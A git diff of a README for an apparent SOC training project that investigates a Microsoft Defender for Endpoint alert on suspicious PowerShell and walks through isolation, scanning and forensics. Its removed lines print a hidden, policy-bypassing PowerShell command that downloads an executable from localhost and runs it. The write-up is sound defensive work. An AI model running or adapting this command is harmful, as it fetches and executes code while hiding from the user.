@@ -1,23 +1,10 @@
-
-🛡️ Project Overview
-This project focuses on a Suspicious PowerShell Command Line alert. The scenario involves an attacker attempting to bypass execution policies and download a secondary payload (invoice.exe) while remaining hidden from the end-user.
-
-By documenting this incident, I showcase my ability to navigate the Defender for Endpoint portal, interpret the Attack Story, and perform critical remediation actions like device isolation and automated investigations.
-
-🕵️ The Incident: Suspicious PowerShell Execution
-Alert Trigger: Suspicious PowerShell Command Line The Malicious Command:
-
-PowerShell
-powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden -Command { $ErrorActionPreference = 'SilentlyContinue'; (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\test-WDATP-test\invoice.exe'); Start-Process 'C:\test-WDATP-test\invoice.exe' }
-
-
 # 🚨 Suspicious PowerShell Command Line Investigation (Microsoft Defender for Endpoint)
 
 ## 🛡️📌 Project Overview
 
 This GitHub project documents a **realistic SOC-style incident investigation** based on a **Microsoft Defender for Endpoint alert** triggered by a **Suspicious PowerShell Command Line execution**.
-
-The project demonstrates how a **Security Analyst** investigates, responds to, and remediates a potentially malicious PowerShell-based attack leveraging **execution policy bypass**, **hidden windows**, and **in-memory payload delivery** — a common attacker technique.
+This project focuses on a Suspicious PowerShell Command Line alert. The scenario involves an attacker attempting to bypass execution policies and download a secondary payload (invoice.exe) while remaining hidden from the end-user.
+By documenting this incident, I showcase my ability to navigate the Defender for Endpoint portal, interpret the Attack Story, and perform critical remediation actions like device isolation and automated investigations.
 
 This repository is designed for:
 
@@ -29,8 +16,10 @@ This repository is designed for:
 ---
 
 ## 🛑 Alert Summary
+# 🕵️ The Incident: Suspicious PowerShell Execution
+# Alert Trigger: Suspicious PowerShell Command Line The Malicious Command:
 
-<img width="468" height="107" alt="image" src="https://github.com/user-attachments/assets/345dfff3-6bf8-4e6a-914e-fea27a6c0ec3" />
+![image alt](https://github.com/Chrisrajasekar/Suspicious-PowerShell-Command-Line-Investigation/blob/2d408e9fbe08d8caf814cfd1bd439d5ed39202a6/Incident%20Alert.png)
 
 
 | Field        | Value                              |
@@ -41,6 +30,7 @@ This repository is designed for:
 | Technique    | Living-off-the-Land (PowerShell)   |
 | MITRE ATT&CK | T1059.001 – PowerShell             |
 | Category     | Execution / Defense Evasion        |
+
 
 ---
 
@@ -64,7 +54,6 @@ Attackers frequently abuse PowerShell to execute payloads **directly in memory**
 
 ---
 
-
 ## 🚩 Why This Is Suspicious
 
 - **ExecutionPolicy Bypass** → Disables PowerShell security controls and allows scripts to run unrestricted  
@@ -76,7 +65,7 @@ Attackers frequently abuse PowerShell to execute payloads **directly in memory**
 
 ## 📖 Attack Story (Defender Timeline)
 
-    <img width="468" height="228" align="centre" alt="image" src="https://github.com/user-attachments/assets/7382e5af-09be-46f5-a74f-92c6847651b6" />
+   ![image alt](https://github.com/Chrisrajasekar/Suspicious-PowerShell-Command-Line-Investigation/blob/d16293a858cdf3679d62c9b61c49333637911e9b/Attack%20story.png)
 
 The **Attack Story** in Microsoft Defender for Endpoint revealed the following sequence:
 
@@ -91,6 +80,8 @@ The **Attack Story** in Microsoft Defender for Endpoint revealed the following s
 
 ### 1️⃣ Identify the Classification
 
+![image alt](https://github.com/Chrisrajasekar/Suspicious-PowerShell-Command-Line-Investigation/blob/d16293a858cdf3679d62c9b61c49333637911e9b/Identify%20the%20classification.png)
+
 - **Confirmed Threat**  
 - **Malware Delivery via PowerShell**  
 - High-confidence Indicator of Compromise (IOC)  
@@ -100,27 +91,30 @@ The **Attack Story** in Microsoft Defender for Endpoint revealed the following s
 ### 2️⃣ Isolate the Device
 
 - Endpoint isolated using **Microsoft Defender for Endpoint**  
-- Prevented further lateral movement and command-and-control (C2) communication  
+- Prevented further lateral movement and command-and-control (C2) communication
+  ![image alt](https://github.com/Chrisrajasekar/Suspicious-PowerShell-Command-Line-Investigation/blob/d16293a858cdf3679d62c9b61c49333637911e9b/Isolate%20Device.png)
 
 ---
 
 ### 3️⃣ Initiate Automated Investigation
 
 - Triggered **Automated Investigation and Response (AIR)**  
-- Reviewed investigation graph, evidence, and system verdicts  
+- Reviewed investigation graph, evidence, and system verdicts
+   ![image alt](https://github.com/Chrisrajasekar/Suspicious-PowerShell-Command-Line-Investigation/blob/d16293a858cdf3679d62c9b61c49333637911e9b/Intiated%20Automated%20investigation.png)
 
 ---
 
 ### 4️⃣ Run Full Antivirus Scan
 
-- Full antivirus scan initiated  
-- Malicious artifacts detected and quarantined  
+- Full antivirus scan initiated
 
+  ![image alt](https://github.com/Chrisrajasekar/Suspicious-PowerShell-Command-Line-Investigation/blob/d16293a858cdf3679d62c9b61c49333637911e9b/Run%20Antivirus%20Scan.png)
 ---
 
 ### 5️⃣ Forensic Investigation – *The “Why”*
 
 Before closing the alert, the following forensic checks were performed:
+![image  alt](https://github.com/Chrisrajasekar/Suspicious-PowerShell-Command-Line-Investigation/blob/d16293a858cdf3679d62c9b61c49333637911e9b/Forensic%20Investigation.png)
 
 #### 🔗 Parent Process Analysis
 
